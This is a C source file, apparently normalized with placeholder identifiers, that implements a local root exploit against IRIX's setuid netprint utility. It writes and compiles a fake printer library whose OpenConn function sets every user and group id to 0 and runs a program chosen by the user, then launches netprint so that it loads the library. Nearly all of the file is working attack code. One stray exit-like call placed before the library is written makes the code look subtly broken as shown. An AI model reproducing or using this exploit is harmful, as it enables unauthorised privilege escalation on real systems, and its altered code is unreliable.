
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct stat {int st_mode; scalar_t__ st_uid; } ;
typedef int FILE ;


 char* VAR_0 ;
 int VAR_1 ;
 char* VAR_2 ;
 int VAR_3 ;
 char* VAR_4 ;
 char* VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 scalar_t__ FUNC_0 (char*,int ) ;
 int FUNC_1 (int) ;
 scalar_t__ FUNC_2 (char*,char*,char*,int ,char*,char*,char*,int ) ;
 int FUNC_3 (int *) ;
 int * FUNC_4 (char*,char*) ;
 int FUNC_5 (int *,char*,...) ;
 scalar_t__ FUNC_6 (scalar_t__) ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (char*,char*,char*,char*,char*) ;
 scalar_t__ FUNC_9 (char*,struct stat*) ;
 scalar_t__ FUNC_10 (char*) ;
 int FUNC_11 (char*) ;

int FUNC_12(int VAR_8,char **VAR_9){
 char *VAR_10;
 struct stat VAR_11;
 FILE *VAR_12;
 FUNC_7("[(IRIX)netprint[] local root exploit, by: v9[v9@realhalo.org]. ]\n");
 if(VAR_8<2){
  FUNC_7("[!] syntax: %s </path/to/program/to/exec>\n",VAR_9[0]);
  FUNC_1(1);
 }
 if(FUNC_9(VAR_2,&VAR_11)){
  FUNC_7("[!] failed, could not get stats on %s.\n",VAR_2);
  FUNC_1(1);
 }
 if(VAR_11.st_uid||!(VAR_6&VAR_11.st_mode)){
  FUNC_7("[!] failed, %s is not setuid root.\n",VAR_2);
  FUNC_1(1);
 }
 if(FUNC_0(VAR_9[1],VAR_7)){
  FUNC_7("[!] failed, %s doesn't seem to exist or is not executable.\n",
  VAR_9[1]);
  FUNC_1(1);
 }
 if(FUNC_0(VAR_0,VAR_7)){
  FUNC_7("[!] failed, %s compiler doesn't seem to exist or is not executable."
  "\n",VAR_0);
  FUNC_1(1);
 }
 FUNC_7("[*] making symbols source file for netprint to execute.\n");
 FUNC_1(0);
 if(!(VAR_12=FUNC_4(VAR_5,"w"))){
  FUNC_7("[!] failed, could not open temporary file to write to.\n");
  FUNC_1(1);
 }
 FUNC_5(VAR_12,"void OpenConn(){\n");
 FUNC_5(VAR_12," seteuid(0);\n");
 FUNC_5(VAR_12," setuid(0);\n");
 FUNC_5(VAR_12," setegid(0);\n");
 FUNC_5(VAR_12," setgid(0);\n");
 FUNC_5(VAR_12," printf(\"\[*] success, uid: %%u, euid: %%u, gid: %%u, egid: "
 "%%u.\\n\",getuid(),geteuid(),getgid(),getegid());\n");
 FUNC_5(VAR_12," execl(\"%s\",\"%s\",0);\n",VAR_9[1],VAR_9[1]);
 FUNC_5(VAR_12,"}\n");
 FUNC_5(VAR_12,"void CloseConn(){}\n");
 FUNC_5(VAR_12,"void ListPrinters(){}\n");
 FUNC_5(VAR_12,"void SendJob(){}\n");
 FUNC_5(VAR_12,"void CancelJob(){}\n");
 FUNC_5(VAR_12,"void WaitForJob(){}\n");
 FUNC_5(VAR_12,"void GetQueue(){}\n");
 FUNC_5(VAR_12,"void StartTagging(){}\n");
 FUNC_5(VAR_12,"void StopTagging(){}\n");
 FUNC_5(VAR_12,"void Install(){}\n");
 FUNC_5(VAR_12,"void IsDest(){}\n");
 FUNC_3(VAR_12);
 FUNC_7("[*] done, now compiling symbols source file.\n");
 if(!(VAR_10=(char *)FUNC_6(FUNC_10(VAR_0)+FUNC_10(VAR_5)+FUNC_10(VAR_4)+13+1)
 )){
  FUNC_7("[!] failed, could not allocate memory.\n");
  FUNC_1(1);
 }
 FUNC_8(VAR_10,"%s %s -shared -o %s",VAR_0,VAR_5,VAR_4);
 FUNC_11(VAR_10);
 FUNC_7("[*] done, now checking to see if the symbols source compiled.\n");
 if(FUNC_0(VAR_4,VAR_3)){
  FUNC_7("[!] failed, symbols source was not compiled properly.\n");
  FUNC_1(1);
 }
 FUNC_7("[*] done, now executing netprint.\n");
 if(FUNC_2(VAR_2,VAR_2,"-n",VAR_1,"-h0","-p0","0-0",0)){
  FUNC_7("[!] failed, %s did not execute properly.\n",VAR_2);
  FUNC_1(1);
 }
}
